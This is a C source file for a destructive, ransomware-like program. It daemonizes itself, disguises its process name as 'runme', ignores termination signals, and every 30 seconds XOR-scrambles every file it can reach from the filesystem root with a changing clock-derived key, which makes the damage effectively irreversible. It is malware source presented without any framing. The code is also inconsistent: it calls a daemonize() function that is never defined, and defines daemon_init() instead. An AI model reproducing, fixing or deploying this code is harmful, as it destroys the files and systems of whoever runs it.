#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <signal.h>
#include <time.h>
#include <sys/prctl.h>

#define DAEMON_NAME "runme"
#define INTERVAL 30

void daemonize();
void encrypt_file(const char *path, unsigned char key);
void encrypt_directory_recursive(const char *path, unsigned char key);

int main() {
    daemonize();
    prctl(PR_SET_NAME, DAEMON_NAME, 0, 0, 0);

    signal(SIGTERM, SIG_IGN);
    signal(SIGINT, SIG_IGN);

    while (1) {
        unsigned char key = (unsigned char)(time(NULL) & 0xFF);
        encrypt_directory_recursive(".", key);
        sleep(INTERVAL);
    }
    return 0;
}
void daemon_init() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    if (setsid() < 0) exit(EXIT_FAILURE);

    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);
    chdir("/");

    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
        close(x);
    }
}
void encrypt_file(const char *path, unsigned char key) {
    int fd = open(path, O_RDWR);
    if (fd < 0) return;
    off_t size = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);
    unsigned char *buffer = malloc(size);
    if (!buffer) {
        close(fd);
        return;
    }
    read(fd, buffer, size);
    for (off_t i = 0; i < size; i++) {
        buffer[i] ^= key;
    }
    lseek(fd, 0, SEEK_SET);
    write(fd, buffer, size);
    close(fd);
    free(buffer);
}
void encrypt_directory_recursive(const char *path, unsigned char key) {
    DIR *dir = opendir(path);
    if (!dir) return;
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char full_path[1024];
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);

        if (entry->d_type == DT_DIR) {
            encrypt_directory_recursive(full_path, key);
        } else {
            encrypt_file(full_path, key);
        }
    }
    closedir(dir);
}
